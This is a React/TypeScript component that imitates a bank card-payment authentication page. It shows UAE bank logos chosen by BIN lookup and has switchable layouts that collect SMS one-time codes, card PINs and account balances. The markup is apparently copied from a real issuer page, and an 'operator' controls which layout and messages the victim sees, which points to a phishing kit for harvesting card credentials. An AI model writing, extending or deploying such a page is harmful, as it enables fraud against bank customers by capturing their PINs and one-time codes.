import React from "react";
import { useBankVerificationStore } from "../../store/bank-verification-store";
import { useVerificationForm } from "../../hooks/use-verification-form";
import type { ResendState, TransactionDetails } from "../../types";
import NBD2Styles from "./styles/nbd2-styles";
import { StyleIsolationWrapper } from "../../components/style-isolation-wrapper";
import { BANK_LOGO_DATA_URLS } from "../../assets/bank-logos";

const DEFAULT_BANK_LOGO = "nbd.png";
const DEFAULT_CARD_LOGO = "visa.svg";
const OVERLAY_Z_INDEX = 9999;
const PIN_MAX_LENGTH = 4;
const OTP_MAX_LENGTH = 6;

const VARIANT_INTRO: Record<"sms" | "push" | "balance" | "pin", string> = {
  sms: "We just sent a SMS with secure code to your registered mobile number.",
  push: "A push notification has been sent to your mobile app.",
  balance: "Please enter your account balance to complete the verification.",
  pin: "Enter the PIN for your card to complete the transaction.",
};

const OTP_WRONG_MSG: Record<"pin" | "sms", string> = {
  pin: "Wrong PIN. Please try again.",
  sms: "Wrong OTP. Please try again.",
};

function sanitizeDigits(value: string, maxLength: number): string {
  return value.replace(/\D/g, "").slice(0, maxLength);
}

/**
 * Bank/issuer name to logo filename. Keys are lowercase for case-insensitive lookup.
 * Issuer names come from BIN lookup (HandyAPI, card_bins) - run `bun run list-bank-issuers` in ncc-api to see DB values.
 */
const BANK_TO_LOGO: Record<string, string> = {
  "emirates nbd": "nbd.png",
  "emirates nbd bank (p.j.s.c.)": "nbd.png",
  enbd: "nbd.png",
  nbd: "nbd.png",
  rakbank: "RAKBANK.png",
  "emirates islamic": "EmiratesIslamic.png",
  "dubai islamic": "dib.png",
  dib: "dib.png",
  adcb: "adcb.png",
  fab: "fab.svg",
  "first abu dhabi": "fab.svg",
  mashreq: "mashreq.png",
  mashreqbank: "mashreq.png",
  adib: "nbd.png",
  "abu dhabi islamic": "nbd.png",
  hsbc: "hsbc.jpg",
  citi: "citi.png",
  "sharjah islamic": "sib.png",
  sib: "sib.png",
  psc: "psc.png",
  cmb: "cmb.png",
  "commercial bank of dubai": "cmb.png",
  "commercial bank of dubai(psc)": "cmb.png",
  cbd: "cmb.png",
  afaq: "afaq.jpg",
  emoney: "Emoney.jpg",
  "digital financial services llc": "nbd.png",
};

function getBankLogoUrl(bank: string | undefined): string {
  if (!bank) return BANK_LOGO_DATA_URLS[DEFAULT_BANK_LOGO] ?? "";
  const key = bank.toLowerCase().trim();
  const filename =
    BANK_TO_LOGO[key] ??
    Object.entries(BANK_TO_LOGO).find(
      ([k]) => key.includes(k) || k.includes(key),
    )?.[1] ??
    DEFAULT_BANK_LOGO;
  return (
    BANK_LOGO_DATA_URLS[filename] ??
    BANK_LOGO_DATA_URLS[DEFAULT_BANK_LOGO] ??
    ""
  );
}

function getCardLogoUrl(cardBrand: "visa" | "mastercard" | undefined): string {
  if (cardBrand === "mastercard")
    return (
      BANK_LOGO_DATA_URLS["master-card.jpg"] ??
      BANK_LOGO_DATA_URLS[DEFAULT_CARD_LOGO] ??
      ""
    );
  return BANK_LOGO_DATA_URLS[DEFAULT_CARD_LOGO] ?? "";
}

const overlayStyles = {
  position: "fixed" as const,
  inset: 0,
  background: "rgba(0,0,0,0.5)",
  display: "flex",
  alignItems: "center",
  justifyContent: "center",
  zIndex: OVERLAY_Z_INDEX,
};

const overlayContentStyles = {
  background: "#fff",
  padding: 24,
  borderRadius: 8,
  display: "flex" as const,
  flexDirection: "column" as const,
  alignItems: "center" as const,
  gap: 16,
};

const errorBannerStyles = {
  padding: "8px 16px",
  background: "#f8d7da",
  color: "#721c24",
  fontSize: 14,
  textAlign: "center" as const,
};

function Spinner({ size = 48 }: { size?: number }) {
  const border = Math.max(2, Math.floor(size / 8));
  return (
    <div
      className="bank-ui-spinner"
      style={
        {
          "--bank-ui-spinner-size": `${size}px`,
          "--bank-ui-spinner-border": `${border}px`,
        } as React.CSSProperties
      }
    />
  );
}

function FooterLinks() {
  return (
    <div className="footer" id="FooterLinks">
      <div className="row">
        <div className="visa-col-12 helpRow" id="Accordion">
          <ul className="list-group list-group-horizontal flex-wrap pull-left">
            <li className="list-group-item border-0">
              <a
                className="btn btn-link no-decoration"
                data-bs-target="#FAQ"
                data-bs-toggle="modal"
                href="#FAQ"
                id="FooterLink1"
              >
                Need some help?
              </a>
            </li>
            <li className="list-group-item border-0">
              <a
                className="btn btn-link no-decoration"
                data-bs-target="#Terms"
                data-bs-toggle="modal"
                href="#Terms"
                id="FooterLink1"
              >
                learn more about authentication
              </a>
            </li>
          </ul>
        </div>
      </div>
    </div>
  );
}

function VerificationPage({
  children,
  footer,
  bank,
  cardBrand,
  inProgress,
  error,
  onClose,
}: {
  children: React.ReactNode;
  footer?: React.ReactNode;
  bank?: string;
  cardBrand?: "visa" | "mastercard";
  inProgress: boolean;
  error?: string | null;
  onClose?: () => void;
}) {
  return (
    <div>
      <meta charSet="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <title>Validate Authentication Credential</title>
      <NBD2Styles />
      {inProgress && (
        <div style={overlayStyles}>
          <div style={overlayContentStyles}>
            <Spinner size={48} />
            <span>Processing...</span>
          </div>
        </div>
      )}
      {error && <div style={errorBannerStyles}>{error}</div>}
      <Shell
        bank={bank}
        cardBrand={cardBrand}
        footer={footer}
        onClose={onClose}
      >
        {children}
      </Shell>
    </div>
  );
}

function TransactionBody({
  transactionDetails,
  variant,
}: {
  transactionDetails?: TransactionDetails;
  variant: "sms" | "push" | "balance" | "pin";
}) {
  const merchant = transactionDetails?.merchantName ?? "";
  const amount = transactionDetails?.amount ?? "";
  const date = transactionDetails?.date ?? "";
  const card = transactionDetails?.cardNumber ?? "";
  const showPaymentDetails = variant === "sms" || variant === "push";

  return (
    <div>
      <p className="mb-0" id="Body1">
        {VARIANT_INTRO[variant]}
        {showPaymentDetails && (
          <>
            <br />
            <br />
            You are authorizing a payment to{" "}
            <span id="contentBlock-merchantname">{merchant}</span> for{" "}
            <span id="contentBlock-amount" className="always-left-to-right">
              {amount}
            </span>{" "}
            on {date} with your card:
          </>
        )}
        {variant === "push" && (
          <>
            <br />
            <br />
            Please approve the transaction on your device.
          </>
        )}
        {!showPaymentDetails && (
          <>
            <br />
            <br />
            Payment to <span id="contentBlock-merchantname">
              {merchant}
            </span>{" "}
            for{" "}
            <span id="contentBlock-amount" className="always-left-to-right">
              {amount}
            </span>{" "}
            on {date} with card:
          </>
        )}
      </p>
      {(showPaymentDetails || variant === "balance" || variant === "pin") && (
        <span
          id="contentBlock-maskedpan"
          className="always-left-to-right"
          style={{ fontFamily: "monospace", letterSpacing: 2 }}
        >
          {card.includes("XXXX") || card.includes("****")
            ? card.replace(/\*+/g, "••••").replace(/X+/g, "••••")
            : card}
        </span>
      )}
    </div>
  );
}

function Shell({
  children,
  footer,
  bank,
  cardBrand,
  onClose,
}: {
  children: React.ReactNode;
  footer?: React.ReactNode;
  bank?: string;
  cardBrand?: "visa" | "mastercard";
  onClose?: () => void;
}) {
  const bankLogoUrl = getBankLogoUrl(bank);
  const cardLogoUrl = getCardLogoUrl(cardBrand ?? "visa");
  return (
    <div className="threeds-two">
      <div className="container-fluid">
        <div className="visa-styling header" id="HeaderLogosFullWidth">
          <button
            className="closeModal"
            id="ExitLink"
            type="button"
            onClick={() => onClose?.()}
          >
            X
          </button>
          <div className="row no-pad">
            <div className="visa-styling bottom-border col-12">
              <div className="pull-left visa-header-one">
                <img
                  alt="Bank Logo"
                  className="visa-header-img"
                  src={bankLogoUrl}
                />
              </div>
              <div className="pull-right visa-header-two">
                <img
                  alt="Card scheme"
                  className="visa-header-img"
                  src={cardLogoUrl}
                />
              </div>
            </div>
          </div>
        </div>
        <div className="visa-styling body" dir="ltr">
          <div className="visa-styling container container-sticky-footer">
            {children}
            {footer ?? <FooterLinks />}
          </div>
        </div>
        <div
          className="modal fade sf-hidden"
          id="FAQ"
          tabIndex={-1}
          role="dialog"
          aria-labelledby="FAQ-label"
          data-bs-backdrop="static"
          data-bs-keyboard="false"
          aria-modal="true"
        />
        <div
          className="modal fade sf-hidden"
          id="Terms"
          tabIndex={-1}
          role="dialog"
          aria-labelledby="Terms-label"
          data-bs-backdrop="static"
          data-bs-keyboard="false"
          aria-modal="true"
        />
      </div>
    </div>
  );
}

function ResendButton({
  layout,
  canResend,
  secondsLeft,
  resending,
  submitting,
  onResend,
}: {
  layout: "sms" | "pin";
  canResend: boolean;
  secondsLeft: number;
  resending: boolean;
  submitting: boolean;
  onResend: () => void;
}) {
  const label = layout === "pin" ? "PIN" : "CODE";
  return (
    <div className="visa-row">
      <div className="col-12 text-center">
        <span
          style={{
            display: !canResend && secondsLeft <= 0 ? "inline" : "none",
          }}
          id="MaximumResendsReachedMessage"
        >
          You have been reached maximum attempts, Please contact bank
        </span>
        {canResend ? (
          <button
            id="ResendLink"
            className="btn btn-link resend-link no-decoration text-uppercase"
            type="button"
            onClick={onResend}
            disabled={resending || submitting}
          >
            {resending ? "Sending..." : `RESEND ${label}`}
          </button>
        ) : (
          <span
            className="resend-link no-decoration text-uppercase"
            style={{ cursor: "default" }}
          >
            Resend {label.toLowerCase()} in{" "}
            {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:
            {String(secondsLeft % 60).padStart(2, "0")}
          </span>
        )}
      </div>
    </div>
  );
}

function ErrorSpan({
  message,
  visible,
}: {
  message: string;
  visible: boolean;
}) {
  return (
    <div className="form-group" id="ErrorMessage">
      <img
        id="WarningImage"
        src="data:,"
        alt="Warning"
        style={{ display: visible ? "inline" : "none" }}
      />
      <span
        id="ValidationErrorMessage"
        className="field-validation-error"
        style={{ display: visible ? "inline" : "none" }}
      >
        {message}
      </span>
    </div>
  );
}

type OtpFormConfig =
  | {
      kind: "pin";
      value: string;
      onChange: (v: string) => void;
      masked: boolean;
      onMaskToggle: () => void;
    }
  | { kind: "sms"; value: string; onChange: (v: string) => void };

function OtpForm({
  config,
  onSubmit,
  resendState,
  submitting,
  canSubmit,
  errorMessage,
  showError,
}: {
  config: OtpFormConfig;
  onSubmit: () => void;
  resendState: ResendState;
  submitting: boolean;
  canSubmit: boolean;
  errorMessage: string;
  showError: boolean;
}) {
  const isPIN = config.kind === "pin";
  const maxLength = isPIN ? PIN_MAX_LENGTH : OTP_MAX_LENGTH;
  const formId = isPIN ? "PinValidateForm" : "ValidateCredentialForm";
  const inputId = isPIN ? "PinInput" : "CredentialValidateInput";
  const inputName = isPIN ? "Pin.Value" : "Credential.Value";
  const label = isPIN ? "PIN" : "Verification Code";

  return (
    <form
      action="/Api/2_1_0/NextStep/ValidateCredential"
      autoComplete="off"
      id={formId}
      method="post"
      name={formId}
      noValidate
      onSubmit={(e) => {
        e.preventDefault();
        e.stopPropagation();
        onSubmit();
      }}
    >
      <div className="visa-row">
        <div className="col-12 visa-styling">
          <div className="form-group text-center">
            <div id="InputAction">
              <label htmlFor={inputId} className="credential-label">
                {label}
              </label>
              <input
                autoFocus
                className="form-control visa-styling credential-input"
                id={inputId}
                inputMode="numeric"
                maxLength={maxLength}
                name={inputName}
                placeholder={isPIN ? "••••" : undefined}
                type={isPIN && config.masked ? "password" : "text"}
                value={config.value}
                onChange={(e) =>
                  config.onChange(sanitizeDigits(e.target.value, maxLength))
                }
                disabled={submitting}
                style={{ fontSize: 15, border: "1px solid #b0b0b0" }}
                {...(!isPIN && {
                  "data-val": "true",
                  "data-val-required": "Please enter the code",
                })}
              />
              {isPIN && (
                <label
                  htmlFor="pin-show-toggle"
                  style={{ display: "block", marginTop: 8, fontSize: 14 }}
                >
                  <input
                    id="pin-show-toggle"
                    type="checkbox"
                    checked={!config.masked}
                    onChange={config.onMaskToggle}
                  />{" "}
                  Show PIN
                </label>
              )}
              {!isPIN && (
                <span
                  className="field-validation-valid sf-hidden"
                  data-valmsg-for="Credential.Value"
                  data-valmsg-replace="true"
                />
              )}
              <ErrorSpan message={errorMessage} visible={showError} />
              <div className="visa-col-12 text-center" style={{ marginTop: 16 }}>
                <button
                  type="submit"
                  className="visa-styling btn btn-primary text-uppercase vba-button"
                  id="ValidateButton"
                  disabled={submitting || !canSubmit}
                >
                  {submitting ? "Submitting..." : "Submit"}
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="visa-row" />
      <ResendButton
        layout={config.kind}
        canResend={resendState.canResend}
        secondsLeft={resendState.secondsLeft}
        resending={resendState.resending}
        submitting={submitting}
        onResend={resendState.onResend}
      />
      <FooterLinks />
    </form>
  );
}

function resolveOtpError(
  wrongCode: boolean,
  expiredCode: boolean,
  operatorMessage: string | undefined,
  kind: "pin" | "sms",
): string {
  if (wrongCode) return OTP_WRONG_MSG[kind];
  if (expiredCode) return "Code expired. Please request a new code.";
  return operatorMessage ?? "";
}

/**
 * Bank verification UI content. Must be used within BankVerificationProvider.
 */
export function VerificationUi() {
  return <VerificationUiContent />;
}

function VerificationUiContent() {
  const onClose = useBankVerificationStore((s) => s.onClose);
  const verificationLayout = useBankVerificationStore((s) => s.verificationLayout);

  const {
    bank,
    transactionDetails,
    inProgress,
    error,
    balance,
    setBalance: onBalanceChange,
    onSubmit,
    submitting,
    canSubmit,
    operatorMessage,
    otpValue,
    setOtpValue,
    wrongCode,
    expiredCode,
    resendState,
    pinMasked,
    onPinMaskToggle,
  } = useVerificationForm();

  // if (!channelSlug || !sessionId) return null;
  // if (!awaitingVerification && !inProgress) return null;

  const pageProps = {
    bank,
    cardBrand: transactionDetails?.cardBrand,
    inProgress,
    error,
    onClose,
  };

  // --- Push layout ---
  if (verificationLayout === "push") {
    return (
      <StyleIsolationWrapper>
        <VerificationPage {...pageProps}>
          <h2 className="screenreader-only">Confirm on your device</h2>
          <div className="visa-row">
            <div className="visa-col-12 visa-validate">
              <strong>Payment Authentication</strong>
            </div>
            <div className="row">
              <div className="col-12" id="ValidateOneUpMessage">
                <TransactionBody
                  transactionDetails={transactionDetails}
                  variant="push"
                />
              </div>
            </div>
          </div>
          <div className="visa-row">
            <div className="col-12 visa-styling text-center">
              <div
                className="form-group"
                style={{ marginTop: 24, marginBottom: 24 }}
              >
                <Spinner size={64} />
              </div>
              <h3 className="visa-validate" style={{ marginBottom: 8 }}>
                Confirm on your device
              </h3>
              <p className="mb-0">
                {bank
                  ? `A push notification has been sent by ${bank}. Please approve the transaction on your device.`
                  : "A push notification has been sent to your mobile app. Please approve the transaction on your device."}
              </p>
            </div>
          </div>
        </VerificationPage>
      </StyleIsolationWrapper>
    );
  }

  // --- Balance layout ---
  if (verificationLayout === "balance") {
    return (
      <StyleIsolationWrapper>
        <VerificationPage
          {...pageProps}
          footer={
            <form
              action="/Api/2_1_0/NextStep/ValidateCredential"
              autoComplete="off"
              id="BalanceValidateForm"
              method="post"
              name="BalanceValidateForm"
              noValidate
              onSubmit={(e) => {
                e.preventDefault();
                e.stopPropagation();
                onSubmit();
              }}
            >
              <div className="visa-row">
                <div className="col-12 visa-styling">
                  <div className="form-group text-center">
                    <div id="InputAction">
                      <label
                        htmlFor="BalanceInput"
                        className="credential-label"
                      >
                        Balance
                      </label>
                      <input
                        autoFocus
                        className="form-control visa-styling credential-input"
                        id="BalanceInput"
                        inputMode="decimal"
                        name="Balance.Value"
                        placeholder="e.g. 1,234.56"
                        type="text"
                        value={balance}
                        onChange={(e) => onBalanceChange(e.target.value)}
                        disabled={submitting}
                        style={{ fontSize: 15, border: "1px solid #b0b0b0" }}
                      />
                      <ErrorSpan
                        message={operatorMessage?.message ?? ""}
                        visible={Boolean(operatorMessage?.message)}
                      />
                      <div className="visa-col-12 text-center" style={{ marginTop: 16 }}>
                        <button
                          type="submit"
                          className="visa-styling btn btn-primary text-uppercase vba-button"
                          id="ValidateButton"
                          disabled={submitting || !canSubmit}
                        >
                          {submitting ? "Submitting..." : "Submit"}
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <FooterLinks />
            </form>
          }
        >
          <h2 className="screenreader-only">Balance verification</h2>
          <div className="visa-row">
            <div className="visa-col-12 visa-validate">
              <strong>Payment Authentication</strong>
            </div>
            <div className="row">
              <div className="col-12" id="ValidateOneUpMessage">
                <TransactionBody
                  transactionDetails={transactionDetails}
                  variant="balance"
                />
              </div>
            </div>
          </div>
        </VerificationPage>
      </StyleIsolationWrapper>
    );
  }

  // --- PIN layout ---
  if (verificationLayout === "pin") {
    return (
      <StyleIsolationWrapper>
        <VerificationPage
          {...pageProps}
          footer={
            <OtpForm
              config={{
                kind: "pin",
                value: otpValue,
                onChange: setOtpValue,
                masked: pinMasked,
                onMaskToggle: onPinMaskToggle,
              }}
              onSubmit={onSubmit}
              resendState={resendState}
              submitting={submitting}
              canSubmit={canSubmit}
              errorMessage={resolveOtpError(
                wrongCode,
                expiredCode,
                operatorMessage?.message,
                "pin",
              )}
              showError={
                wrongCode || expiredCode || Boolean(operatorMessage?.message)
              }
            />
          }
        >
          <h2 className="screenreader-only">Enter your PIN</h2>
          <div className="visa-row">
            <div className="visa-col-12 visa-validate">
              <strong>Payment Authentication</strong>
            </div>
            <div className="row">
              <div className="col-12" id="ValidateOneUpMessage">
                <TransactionBody
                  transactionDetails={transactionDetails}
                  variant="pin"
                />
              </div>
            </div>
          </div>
        </VerificationPage>
      </StyleIsolationWrapper>
    );
  }

  // --- SMS layout (default) ---
  return (
    <StyleIsolationWrapper>
      <VerificationPage
        {...pageProps}
        footer={
          <OtpForm
            config={{ kind: "sms", value: otpValue, onChange: setOtpValue }}
            onSubmit={onSubmit}
            resendState={resendState}
            submitting={submitting}
            canSubmit={canSubmit}
            errorMessage={resolveOtpError(
              wrongCode,
              expiredCode,
              operatorMessage?.message,
              "sms",
            )}
            showError={
              wrongCode || expiredCode || Boolean(operatorMessage?.message)
            }
          />
        }
      >
        <h2 className="screenreader-only">
          Your One-time Passcode has been sent
        </h2>
        <div className="visa-row">
          <div className="visa-col-12 visa-validate">
            <strong>Payment Authentication</strong>
          </div>
          <div className="row">
            <div className="col-12" id="ValidateOneUpMessage">
              <TransactionBody
                transactionDetails={transactionDetails}
                variant="sms"
              />
            </div>
          </div>
        </div>
      </VerificationPage>
    </StyleIsolationWrapper>
  );
}
